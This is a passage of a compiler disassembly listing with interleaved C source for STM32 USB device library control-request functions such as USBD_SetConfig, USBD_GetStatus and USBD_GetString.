 800be2e:	e059      	b.n	800bee4 <USBD_SetConfig+0x144>

    case USBD_STATE_CONFIGURED:
      if (cfgidx == 0U)
 800be30:	4b2f      	ldr	r3, [pc, #188]	; (800bef0 <USBD_SetConfig+0x150>)
 800be32:	781b      	ldrb	r3, [r3, #0]
 800be34:	2b00      	cmp	r3, #0
 800be36:	d112      	bne.n	800be5e <USBD_SetConfig+0xbe>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800be38:	687b      	ldr	r3, [r7, #4]
 800be3a:	2202      	movs	r2, #2
 800be3c:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
        pdev->dev_config = cfgidx;
 800be40:	4b2b      	ldr	r3, [pc, #172]	; (800bef0 <USBD_SetConfig+0x150>)
 800be42:	781b      	ldrb	r3, [r3, #0]
 800be44:	461a      	mov	r2, r3
 800be46:	687b      	ldr	r3, [r7, #4]
 800be48:	605a      	str	r2, [r3, #4]
        (void)USBD_ClrClassConfig(pdev, cfgidx);
 800be4a:	4b29      	ldr	r3, [pc, #164]	; (800bef0 <USBD_SetConfig+0x150>)
 800be4c:	781b      	ldrb	r3, [r3, #0]
 800be4e:	4619      	mov	r1, r3
 800be50:	6878      	ldr	r0, [r7, #4]
 800be52:	f7ff f837 	bl	800aec4 <USBD_ClrClassConfig>
        (void)USBD_CtlSendStatus(pdev);
 800be56:	6878      	ldr	r0, [r7, #4]
 800be58:	f000 fa06 	bl	800c268 <USBD_CtlSendStatus>
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800be5c:	e042      	b.n	800bee4 <USBD_SetConfig+0x144>
      else if (cfgidx != pdev->dev_config)
 800be5e:	4b24      	ldr	r3, [pc, #144]	; (800bef0 <USBD_SetConfig+0x150>)
 800be60:	781b      	ldrb	r3, [r3, #0]
 800be62:	461a      	mov	r2, r3
 800be64:	687b      	ldr	r3, [r7, #4]
 800be66:	685b      	ldr	r3, [r3, #4]
 800be68:	429a      	cmp	r2, r3
 800be6a:	d02a      	beq.n	800bec2 <USBD_SetConfig+0x122>
        (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800be6c:	687b      	ldr	r3, [r7, #4]
 800be6e:	685b      	ldr	r3, [r3, #4]
 800be70:	b2db      	uxtb	r3, r3
 800be72:	4619      	mov	r1, r3
 800be74:	6878      	ldr	r0, [r7, #4]
 800be76:	f7ff f825 	bl	800aec4 <USBD_ClrClassConfig>
        pdev->dev_config = cfgidx;
 800be7a:	4b1d      	ldr	r3, [pc, #116]	; (800bef0 <USBD_SetConfig+0x150>)
 800be7c:	781b      	ldrb	r3, [r3, #0]
 800be7e:	461a      	mov	r2, r3
 800be80:	687b      	ldr	r3, [r7, #4]
 800be82:	605a      	str	r2, [r3, #4]
        ret = USBD_SetClassConfig(pdev, cfgidx);
 800be84:	4b1a      	ldr	r3, [pc, #104]	; (800bef0 <USBD_SetConfig+0x150>)
 800be86:	781b      	ldrb	r3, [r3, #0]
 800be88:	4619      	mov	r1, r3
 800be8a:	6878      	ldr	r0, [r7, #4]
 800be8c:	f7fe fffe 	bl	800ae8c <USBD_SetClassConfig>
 800be90:	4603      	mov	r3, r0
 800be92:	73fb      	strb	r3, [r7, #15]
        if (ret != USBD_OK)
 800be94:	7bfb      	ldrb	r3, [r7, #15]
 800be96:	2b00      	cmp	r3, #0
 800be98:	d00f      	beq.n	800beba <USBD_SetConfig+0x11a>
          USBD_CtlError(pdev, req);
 800be9a:	6839      	ldr	r1, [r7, #0]
 800be9c:	6878      	ldr	r0, [r7, #4]
 800be9e:	f000 f918 	bl	800c0d2 <USBD_CtlError>
          (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bea2:	687b      	ldr	r3, [r7, #4]
 800bea4:	685b      	ldr	r3, [r3, #4]
 800bea6:	b2db      	uxtb	r3, r3
 800bea8:	4619      	mov	r1, r3
 800beaa:	6878      	ldr	r0, [r7, #4]
 800beac:	f7ff f80a 	bl	800aec4 <USBD_ClrClassConfig>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800beb0:	687b      	ldr	r3, [r7, #4]
 800beb2:	2202      	movs	r2, #2
 800beb4:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800beb8:	e014      	b.n	800bee4 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800beba:	6878      	ldr	r0, [r7, #4]
 800bebc:	f000 f9d4 	bl	800c268 <USBD_CtlSendStatus>
      break;
 800bec0:	e010      	b.n	800bee4 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800bec2:	6878      	ldr	r0, [r7, #4]
 800bec4:	f000 f9d0 	bl	800c268 <USBD_CtlSendStatus>
      break;
 800bec8:	e00c      	b.n	800bee4 <USBD_SetConfig+0x144>

    default:
      USBD_CtlError(pdev, req);
 800beca:	6839      	ldr	r1, [r7, #0]
 800becc:	6878      	ldr	r0, [r7, #4]
 800bece:	f000 f900 	bl	800c0d2 <USBD_CtlError>
      (void)USBD_ClrClassConfig(pdev, cfgidx);
 800bed2:	4b07      	ldr	r3, [pc, #28]	; (800bef0 <USBD_SetConfig+0x150>)
 800bed4:	781b      	ldrb	r3, [r3, #0]
 800bed6:	4619      	mov	r1, r3
 800bed8:	6878      	ldr	r0, [r7, #4]
 800beda:	f7fe fff3 	bl	800aec4 <USBD_ClrClassConfig>
      ret = USBD_FAIL;
 800bede:	2303      	movs	r3, #3
 800bee0:	73fb      	strb	r3, [r7, #15]
      break;
 800bee2:	bf00      	nop
  }

  return ret;
 800bee4:	7bfb      	ldrb	r3, [r7, #15]
}
 800bee6:	4618      	mov	r0, r3
 800bee8:	3710      	adds	r7, #16
 800beea:	46bd      	mov	sp, r7
 800beec:	bd80      	pop	{r7, pc}
 800beee:	bf00      	nop
 800bef0:	200003bc 	.word	0x200003bc

0800bef4 <USBD_GetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bef4:	b580      	push	{r7, lr}
 800bef6:	b082      	sub	sp, #8
 800bef8:	af00      	add	r7, sp, #0
 800befa:	6078      	str	r0, [r7, #4]
 800befc:	6039      	str	r1, [r7, #0]
  if (req->wLength != 1U)
 800befe:	683b      	ldr	r3, [r7, #0]
 800bf00:	88db      	ldrh	r3, [r3, #6]
 800bf02:	2b01      	cmp	r3, #1
 800bf04:	d004      	beq.n	800bf10 <USBD_GetConfig+0x1c>
  {
    USBD_CtlError(pdev, req);
 800bf06:	6839      	ldr	r1, [r7, #0]
 800bf08:	6878      	ldr	r0, [r7, #4]
 800bf0a:	f000 f8e2 	bl	800c0d2 <USBD_CtlError>
      default:
        USBD_CtlError(pdev, req);
        break;
    }
  }
}
 800bf0e:	e023      	b.n	800bf58 <USBD_GetConfig+0x64>
    switch (pdev->dev_state)
 800bf10:	687b      	ldr	r3, [r7, #4]
 800bf12:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bf16:	b2db      	uxtb	r3, r3
 800bf18:	2b02      	cmp	r3, #2
 800bf1a:	dc02      	bgt.n	800bf22 <USBD_GetConfig+0x2e>
 800bf1c:	2b00      	cmp	r3, #0
 800bf1e:	dc03      	bgt.n	800bf28 <USBD_GetConfig+0x34>
 800bf20:	e015      	b.n	800bf4e <USBD_GetConfig+0x5a>
 800bf22:	2b03      	cmp	r3, #3
 800bf24:	d00b      	beq.n	800bf3e <USBD_GetConfig+0x4a>
 800bf26:	e012      	b.n	800bf4e <USBD_GetConfig+0x5a>
        pdev->dev_default_config = 0U;
 800bf28:	687b      	ldr	r3, [r7, #4]
 800bf2a:	2200      	movs	r2, #0
 800bf2c:	609a      	str	r2, [r3, #8]
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_default_config, 1U);
 800bf2e:	687b      	ldr	r3, [r7, #4]
 800bf30:	3308      	adds	r3, #8
 800bf32:	2201      	movs	r2, #1
 800bf34:	4619      	mov	r1, r3
 800bf36:	6878      	ldr	r0, [r7, #4]
 800bf38:	f000 f93c 	bl	800c1b4 <USBD_CtlSendData>
        break;
 800bf3c:	e00c      	b.n	800bf58 <USBD_GetConfig+0x64>
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config, 1U);
 800bf3e:	687b      	ldr	r3, [r7, #4]
 800bf40:	3304      	adds	r3, #4
 800bf42:	2201      	movs	r2, #1
 800bf44:	4619      	mov	r1, r3
 800bf46:	6878      	ldr	r0, [r7, #4]
 800bf48:	f000 f934 	bl	800c1b4 <USBD_CtlSendData>
        break;
 800bf4c:	e004      	b.n	800bf58 <USBD_GetConfig+0x64>
        USBD_CtlError(pdev, req);
 800bf4e:	6839      	ldr	r1, [r7, #0]
 800bf50:	6878      	ldr	r0, [r7, #4]
 800bf52:	f000 f8be 	bl	800c0d2 <USBD_CtlError>
        break;
 800bf56:	bf00      	nop
}
 800bf58:	bf00      	nop
 800bf5a:	3708      	adds	r7, #8
 800bf5c:	46bd      	mov	sp, r7
 800bf5e:	bd80      	pop	{r7, pc}

0800bf60 <USBD_GetStatus>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetStatus(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bf60:	b580      	push	{r7, lr}
 800bf62:	b082      	sub	sp, #8
 800bf64:	af00      	add	r7, sp, #0
 800bf66:	6078      	str	r0, [r7, #4]
 800bf68:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800bf6a:	687b      	ldr	r3, [r7, #4]
 800bf6c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bf70:	b2db      	uxtb	r3, r3
 800bf72:	3b01      	subs	r3, #1
 800bf74:	2b02      	cmp	r3, #2
 800bf76:	d81e      	bhi.n	800bfb6 <USBD_GetStatus+0x56>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wLength != 0x2U)
 800bf78:	683b      	ldr	r3, [r7, #0]
 800bf7a:	88db      	ldrh	r3, [r3, #6]
 800bf7c:	2b02      	cmp	r3, #2
 800bf7e:	d004      	beq.n	800bf8a <USBD_GetStatus+0x2a>
      {
        USBD_CtlError(pdev, req);
 800bf80:	6839      	ldr	r1, [r7, #0]
 800bf82:	6878      	ldr	r0, [r7, #4]
 800bf84:	f000 f8a5 	bl	800c0d2 <USBD_CtlError>
        break;
 800bf88:	e01a      	b.n	800bfc0 <USBD_GetStatus+0x60>
      }

#if (USBD_SELF_POWERED == 1U)
      pdev->dev_config_status = USB_CONFIG_SELF_POWERED;
 800bf8a:	687b      	ldr	r3, [r7, #4]
 800bf8c:	2201      	movs	r2, #1
 800bf8e:	60da      	str	r2, [r3, #12]
#else
      pdev->dev_config_status = 0U;
#endif /* USBD_SELF_POWERED */

      if (pdev->dev_remote_wakeup != 0U)
 800bf90:	687b      	ldr	r3, [r7, #4]
 800bf92:	f8d3 32a4 	ldr.w	r3, [r3, #676]	; 0x2a4
 800bf96:	2b00      	cmp	r3, #0
 800bf98:	d005      	beq.n	800bfa6 <USBD_GetStatus+0x46>
      {
        pdev->dev_config_status |= USB_CONFIG_REMOTE_WAKEUP;
 800bf9a:	687b      	ldr	r3, [r7, #4]
 800bf9c:	68db      	ldr	r3, [r3, #12]
 800bf9e:	f043 0202 	orr.w	r2, r3, #2
 800bfa2:	687b      	ldr	r3, [r7, #4]
 800bfa4:	60da      	str	r2, [r3, #12]
      }

      (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config_status, 2U);
 800bfa6:	687b      	ldr	r3, [r7, #4]
 800bfa8:	330c      	adds	r3, #12
 800bfaa:	2202      	movs	r2, #2
 800bfac:	4619      	mov	r1, r3
 800bfae:	6878      	ldr	r0, [r7, #4]
 800bfb0:	f000 f900 	bl	800c1b4 <USBD_CtlSendData>
      break;
 800bfb4:	e004      	b.n	800bfc0 <USBD_GetStatus+0x60>

    default:
      USBD_CtlError(pdev, req);
 800bfb6:	6839      	ldr	r1, [r7, #0]
 800bfb8:	6878      	ldr	r0, [r7, #4]
 800bfba:	f000 f88a 	bl	800c0d2 <USBD_CtlError>
      break;
 800bfbe:	bf00      	nop
  }
}
 800bfc0:	bf00      	nop
 800bfc2:	3708      	adds	r7, #8
 800bfc4:	46bd      	mov	sp, r7
 800bfc6:	bd80      	pop	{r7, pc}

0800bfc8 <USBD_SetFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bfc8:	b580      	push	{r7, lr}
 800bfca:	b082      	sub	sp, #8
 800bfcc:	af00      	add	r7, sp, #0
 800bfce:	6078      	str	r0, [r7, #4]
 800bfd0:	6039      	str	r1, [r7, #0]
  if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800bfd2:	683b      	ldr	r3, [r7, #0]
 800bfd4:	885b      	ldrh	r3, [r3, #2]
 800bfd6:	2b01      	cmp	r3, #1
 800bfd8:	d107      	bne.n	800bfea <USBD_SetFeature+0x22>
  {
    pdev->dev_remote_wakeup = 1U;
 800bfda:	687b      	ldr	r3, [r7, #4]
 800bfdc:	2201      	movs	r2, #1
 800bfde:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
    (void)USBD_CtlSendStatus(pdev);
 800bfe2:	6878      	ldr	r0, [r7, #4]
 800bfe4:	f000 f940 	bl	800c268 <USBD_CtlSendStatus>
  }
  else
  {
    USBD_CtlError(pdev, req);
  }
}
 800bfe8:	e013      	b.n	800c012 <USBD_SetFeature+0x4a>
  else if (req->wValue == USB_FEATURE_TEST_MODE)
 800bfea:	683b      	ldr	r3, [r7, #0]
 800bfec:	885b      	ldrh	r3, [r3, #2]
 800bfee:	2b02      	cmp	r3, #2
 800bff0:	d10b      	bne.n	800c00a <USBD_SetFeature+0x42>
    pdev->dev_test_mode = (uint8_t)(req->wIndex >> 8);
 800bff2:	683b      	ldr	r3, [r7, #0]
 800bff4:	889b      	ldrh	r3, [r3, #4]
 800bff6:	0a1b      	lsrs	r3, r3, #8
 800bff8:	b29b      	uxth	r3, r3
 800bffa:	b2da      	uxtb	r2, r3
 800bffc:	687b      	ldr	r3, [r7, #4]
 800bffe:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
    (void)USBD_CtlSendStatus(pdev);
 800c002:	6878      	ldr	r0, [r7, #4]
 800c004:	f000 f930 	bl	800c268 <USBD_CtlSendStatus>
}
 800c008:	e003      	b.n	800c012 <USBD_SetFeature+0x4a>
    USBD_CtlError(pdev, req);
 800c00a:	6839      	ldr	r1, [r7, #0]
 800c00c:	6878      	ldr	r0, [r7, #4]
 800c00e:	f000 f860 	bl	800c0d2 <USBD_CtlError>
}
 800c012:	bf00      	nop
 800c014:	3708      	adds	r7, #8
 800c016:	46bd      	mov	sp, r7
 800c018:	bd80      	pop	{r7, pc}

0800c01a <USBD_ClrFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_ClrFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c01a:	b580      	push	{r7, lr}
 800c01c:	b082      	sub	sp, #8
 800c01e:	af00      	add	r7, sp, #0
 800c020:	6078      	str	r0, [r7, #4]
 800c022:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c024:	687b      	ldr	r3, [r7, #4]
 800c026:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c02a:	b2db      	uxtb	r3, r3
 800c02c:	3b01      	subs	r3, #1
 800c02e:	2b02      	cmp	r3, #2
 800c030:	d80b      	bhi.n	800c04a <USBD_ClrFeature+0x30>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c032:	683b      	ldr	r3, [r7, #0]
 800c034:	885b      	ldrh	r3, [r3, #2]
 800c036:	2b01      	cmp	r3, #1
 800c038:	d10c      	bne.n	800c054 <USBD_ClrFeature+0x3a>
      {
        pdev->dev_remote_wakeup = 0U;
 800c03a:	687b      	ldr	r3, [r7, #4]
 800c03c:	2200      	movs	r2, #0
 800c03e:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
        (void)USBD_CtlSendStatus(pdev);
 800c042:	6878      	ldr	r0, [r7, #4]
 800c044:	f000 f910 	bl	800c268 <USBD_CtlSendStatus>
      }
      break;
 800c048:	e004      	b.n	800c054 <USBD_ClrFeature+0x3a>

    default:
      USBD_CtlError(pdev, req);
 800c04a:	6839      	ldr	r1, [r7, #0]
 800c04c:	6878      	ldr	r0, [r7, #4]
 800c04e:	f000 f840 	bl	800c0d2 <USBD_CtlError>
      break;
 800c052:	e000      	b.n	800c056 <USBD_ClrFeature+0x3c>
      break;
 800c054:	bf00      	nop
  }
}
 800c056:	bf00      	nop
 800c058:	3708      	adds	r7, #8
 800c05a:	46bd      	mov	sp, r7
 800c05c:	bd80      	pop	{r7, pc}

0800c05e <USBD_ParseSetupRequest>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_ParseSetupRequest(USBD_SetupReqTypedef *req, uint8_t *pdata)
{
 800c05e:	b580      	push	{r7, lr}
 800c060:	b084      	sub	sp, #16
 800c062:	af00      	add	r7, sp, #0
 800c064:	6078      	str	r0, [r7, #4]
 800c066:	6039      	str	r1, [r7, #0]
  uint8_t *pbuff = pdata;
 800c068:	683b      	ldr	r3, [r7, #0]
 800c06a:	60fb      	str	r3, [r7, #12]

  req->bmRequest = *(uint8_t *)(pbuff);
 800c06c:	68fb      	ldr	r3, [r7, #12]
 800c06e:	781a      	ldrb	r2, [r3, #0]
 800c070:	687b      	ldr	r3, [r7, #4]
 800c072:	701a      	strb	r2, [r3, #0]

  pbuff++;
 800c074:	68fb      	ldr	r3, [r7, #12]
 800c076:	3301      	adds	r3, #1
 800c078:	60fb      	str	r3, [r7, #12]
  req->bRequest = *(uint8_t *)(pbuff);
 800c07a:	68fb      	ldr	r3, [r7, #12]
 800c07c:	781a      	ldrb	r2, [r3, #0]
 800c07e:	687b      	ldr	r3, [r7, #4]
 800c080:	705a      	strb	r2, [r3, #1]

  pbuff++;
 800c082:	68fb      	ldr	r3, [r7, #12]
 800c084:	3301      	adds	r3, #1
 800c086:	60fb      	str	r3, [r7, #12]
  req->wValue = SWAPBYTE(pbuff);
 800c088:	68f8      	ldr	r0, [r7, #12]
 800c08a:	f7ff fa16 	bl	800b4ba <SWAPBYTE>
 800c08e:	4603      	mov	r3, r0
 800c090:	461a      	mov	r2, r3
 800c092:	687b      	ldr	r3, [r7, #4]
 800c094:	805a      	strh	r2, [r3, #2]

  pbuff++;
 800c096:	68fb      	ldr	r3, [r7, #12]
 800c098:	3301      	adds	r3, #1
 800c09a:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c09c:	68fb      	ldr	r3, [r7, #12]
 800c09e:	3301      	adds	r3, #1
 800c0a0:	60fb      	str	r3, [r7, #12]
  req->wIndex = SWAPBYTE(pbuff);
 800c0a2:	68f8      	ldr	r0, [r7, #12]
 800c0a4:	f7ff fa09 	bl	800b4ba <SWAPBYTE>
 800c0a8:	4603      	mov	r3, r0
 800c0aa:	461a      	mov	r2, r3
 800c0ac:	687b      	ldr	r3, [r7, #4]
 800c0ae:	809a      	strh	r2, [r3, #4]

  pbuff++;
 800c0b0:	68fb      	ldr	r3, [r7, #12]
 800c0b2:	3301      	adds	r3, #1
 800c0b4:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c0b6:	68fb      	ldr	r3, [r7, #12]
 800c0b8:	3301      	adds	r3, #1
 800c0ba:	60fb      	str	r3, [r7, #12]
  req->wLength = SWAPBYTE(pbuff);
 800c0bc:	68f8      	ldr	r0, [r7, #12]
 800c0be:	f7ff f9fc 	bl	800b4ba <SWAPBYTE>
 800c0c2:	4603      	mov	r3, r0
 800c0c4:	461a      	mov	r2, r3
 800c0c6:	687b      	ldr	r3, [r7, #4]
 800c0c8:	80da      	strh	r2, [r3, #6]
}
 800c0ca:	bf00      	nop
 800c0cc:	3710      	adds	r7, #16
 800c0ce:	46bd      	mov	sp, r7
 800c0d0:	bd80      	pop	{r7, pc}

0800c0d2 <USBD_CtlError>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_CtlError(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c0d2:	b580      	push	{r7, lr}
 800c0d4:	b082      	sub	sp, #8
 800c0d6:	af00      	add	r7, sp, #0
 800c0d8:	6078      	str	r0, [r7, #4]
 800c0da:	6039      	str	r1, [r7, #0]
  UNUSED(req);

  (void)USBD_LL_StallEP(pdev, 0x80U);
 800c0dc:	2180      	movs	r1, #128	; 0x80
 800c0de:	6878      	ldr	r0, [r7, #4]
 800c0e0:	f000 fd6a 	bl	800cbb8 <USBD_LL_StallEP>
  (void)USBD_LL_StallEP(pdev, 0U);
 800c0e4:	2100      	movs	r1, #0
 800c0e6:	6878      	ldr	r0, [r7, #4]
 800c0e8:	f000 fd66 	bl	800cbb8 <USBD_LL_StallEP>
}
 800c0ec:	bf00      	nop
 800c0ee:	3708      	adds	r7, #8
 800c0f0:	46bd      	mov	sp, r7
 800c0f2:	bd80      	pop	{r7, pc}

0800c0f4 <USBD_GetString>:
  * @param  unicode : Formatted string buffer (unicode)
  * @param  len : descriptor length
  * @retval None
  */
void USBD_GetString(uint8_t *desc, uint8_t *unicode, uint16_t *len)
{
 800c0f4:	b580      	push	{r7, lr}
 800c0f6:	b086      	sub	sp, #24
 800c0f8:	af00      	add	r7, sp, #0
 800c0fa:	60f8      	str	r0, [r7, #12]
 800c0fc:	60b9      	str	r1, [r7, #8]
 800c0fe:	607a      	str	r2, [r7, #4]
  uint8_t idx = 0U;
 800c100:	2300      	movs	r3, #0
 800c102:	75fb      	strb	r3, [r7, #23]
  uint8_t *pdesc;

  if (desc == NULL)
 800c104:	68fb      	ldr	r3, [r7, #12]
 800c106:	2b00      	cmp	r3, #0
 800c108:	d036      	beq.n	800c178 <USBD_GetString+0x84>
  {
    return;
  }

  pdesc = desc;
 800c10a:	68fb      	ldr	r3, [r7, #12]
 800c10c:	613b      	str	r3, [r7, #16]
  *len = ((uint16_t)USBD_GetLen(pdesc) * 2U) + 2U;
 800c10e:	6938      	ldr	r0, [r7, #16]
 800c110:	f000 f836 	bl	800c180 <USBD_GetLen>
 800c114:	4603      	mov	r3, r0
 800c116:	3301      	adds	r3, #1
 800c118:	b29b      	uxth	r3, r3
 800c11a:	005b      	lsls	r3, r3, #1
 800c11c:	b29a      	uxth	r2, r3
 800c11e:	687b      	ldr	r3, [r7, #4]
 800c120:	801a      	strh	r2, [r3, #0]

  unicode[idx] = *(uint8_t *)len;
 800c122:	7dfb      	ldrb	r3, [r7, #23]
 800c124:	68ba      	ldr	r2, [r7, #8]
 800c126:	4413      	add	r3, r2
 800c128:	687a      	ldr	r2, [r7, #4]
 800c12a:	7812      	ldrb	r2, [r2, #0]
 800c12c:	701a      	strb	r2, [r3, #0]
  idx++;
 800c12e:	7dfb      	ldrb	r3, [r7, #23]
 800c130:	3301      	adds	r3, #1
 800c132:	75fb      	strb	r3, [r7, #23]
  unicode[idx] = USB_DESC_TYPE_STRING;
 800c134:	7dfb      	ldrb	r3, [r7, #23]
 800c136:	68ba      	ldr	r2, [r7, #8]
 800c138:	4413      	add	r3, r2
 800c13a:	2203      	movs	r2, #3
 800c13c:	701a      	strb	r2, [r3, #0]
  idx++;
 800c13e:	7dfb      	ldrb	r3, [r7, #23]
 800c140:	3301      	adds	r3, #1
 800c142:	75fb      	strb	r3, [r7, #23]

  while (*pdesc != (uint8_t)'\0')
 800c144:	e013      	b.n	800c16e <USBD_GetString+0x7a>
  {
    unicode[idx] = *pdesc;
 800c146:	7dfb      	ldrb	r3, [r7, #23]
 800c148:	68ba      	ldr	r2, [r7, #8]
 800c14a:	4413      	add	r3, r2
 800c14c:	693a      	ldr	r2, [r7, #16]
 800c14e:	7812      	ldrb	r2, [r2, #0]
 800c150:	701a      	strb	r2, [r3, #0]
    pdesc++;
 800c152:	693b      	ldr	r3, [r7, #16]
 800c154:	3301      	adds	r3, #1
 800c156:	613b      	str	r3, [r7, #16]
    idx++;
 800c158:	7dfb      	ldrb	r3, [r7, #23]
 800c15a:	3301      	adds	r3, #1
 800c15c:	75fb      	strb	r3, [r7, #23]

    unicode[idx] = 0U;
 800c15e:	7dfb      	ldrb	r3, [r7, #23]
 800c160:	68ba      	ldr	r2, [r7, #8]
 800c162:	4413      	add	r3, r2
 800c164:	2200      	movs	r2, #0
 800c166:	701a      	strb	r2, [r3, #0]
    idx++;
 800c168:	7dfb      	ldrb	r3, [r7, #23]
 800c16a:	3301      	adds	r3, #1
 800c16c:	75fb      	strb	r3, [r7, #23]
  while (*pdesc != (uint8_t)'\0')
 800c16e:	693b      	ldr	r3, [r7, #16]
 800c170:	781b      	ldrb	r3, [r3, #0]
 800c172:	2b00      	cmp	r3, #0
 800c174:	d1e7      	bne.n	800c146 <USBD_GetString+0x52>
 800c176:	e000      	b.n	800c17a <USBD_GetString+0x86>
    return;
 800c178:	bf00      	nop
  }
}
 800c17a:	3718      	adds	r7, #24
 800c17c:	46bd      	mov	sp, r7
 800c17e:	bd80      	pop	{r7, pc}

0800c180 <USBD_GetLen>:
  *         return the string length
   * @param  buf : pointer to the ascii string buffer
  * @retval string length
  */
static uint8_t USBD_GetLen(uint8_t *buf)
{
 800c180:	b480      	push	{r7}
 800c182:	b085      	sub	sp, #20
 800c184:	af00      	add	r7, sp, #0
 800c186:	6078      	str	r0, [r7, #4]
  uint8_t  len = 0U;
 800c188:	2300      	movs	r3, #0
 800c18a:	73fb      	strb	r3, [r7, #15]
  uint8_t *pbuff = buf;
 800c18c:	687b      	ldr	r3, [r7, #4]
 800c18e:	60bb      	str	r3, [r7, #8]

  while (*pbuff != (uint8_t)'\0')
 800c190:	e005      	b.n	800c19e <USBD_GetLen+0x1e>
  {
    len++;
 800c192:	7bfb      	ldrb	r3, [r7, #15]
 800c194:	3301      	adds	r3, #1
 800c196:	73fb      	strb	r3, [r7, #15]
    pbuff++;
 800c198:	68bb      	ldr	r3, [r7, #8]
 800c19a:	3301      	adds	r3, #1
 800c19c:	60bb      	str	r3, [r7, #8]
  while (*pbuff != (uint8_t)'\0')
 800c19e:	68bb      	ldr	r3, [r7, #8]
 800c1a0:	781b      	ldrb	r3, [r3, #0]
 800c1a2:	2b00      	cmp	r3, #0
 800c1a4:	d1f5      	bne.n	800c192 <USBD_GetLen+0x12>
  }

  return len;
 800c1a6:	7bfb      	ldrb	r3, [r7, #15]
}
 800c1a8:	4618      	mov	r0, r3
 800c1aa:	3714      	adds	r7, #20
 800c1ac:	46bd      	mov	sp, r7
 800c1ae:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c1b2:	4770      	bx	lr

0800c1b4 <USBD_CtlSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendData(USBD_HandleTypeDef *pdev,
                                    uint8_t *pbuf, uint32_t len)
{
 800c1b4:	b580      	push	{r7, lr}
 800c1b6:	b084      	sub	sp, #16
 800c1b8:	af00      	add	r7, sp, #0
 800c1ba:	60f8      	str	r0, [r7, #12]
 800c1bc:	60b9      	str	r1, [r7, #8]
 800c1be:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_IN;
 800c1c0:	68fb      	ldr	r3, [r7, #12]
 800c1c2:	2202      	movs	r2, #2
 800c1c4:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_in[0].total_length = len;
 800c1c8:	68fb      	ldr	r3, [r7, #12]
 800c1ca:	687a      	ldr	r2, [r7, #4]
 800c1cc:	619a      	str	r2, [r3, #24]

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_in[0].rem_length = 0U;
#else
  pdev->ep_in[0].rem_length = len;
 800c1ce:	68fb      	ldr	r3, [r7, #12]
 800c1d0:	687a      	ldr	r2, [r7, #4]
 800c1d2:	61da      	str	r2, [r3, #28]
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c1d4:	687b      	ldr	r3, [r7, #4]
 800c1d6:	68ba      	ldr	r2, [r7, #8]
 800c1d8:	2100      	movs	r1, #0
 800c1da:	68f8      	ldr	r0, [r7, #12]
 800c1dc:	f000 fdbc 	bl	800cd58 <USBD_LL_Transmit>

  return USBD_OK;
 800c1e0:	2300      	movs	r3, #0
}
 800c1e2:	4618      	mov	r0, r3
 800c1e4:	3710      	adds	r7, #16
 800c1e6:	46bd      	mov	sp, r7
 800c1e8:	bd80      	pop	{r7, pc}

0800c1ea <USBD_CtlContinueSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueSendData(USBD_HandleTypeDef *pdev,
                                            uint8_t *pbuf, uint32_t len)
{
 800c1ea:	b580      	push	{r7, lr}
 800c1ec:	b084      	sub	sp, #16
 800c1ee:	af00      	add	r7, sp, #0
 800c1f0:	60f8      	str	r0, [r7, #12]
 800c1f2:	60b9      	str	r1, [r7, #8]
 800c1f4:	607a      	str	r2, [r7, #4]
  /* Start the next transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c1f6:	687b      	ldr	r3, [r7, #4]
 800c1f8:	68ba      	ldr	r2, [r7, #8]
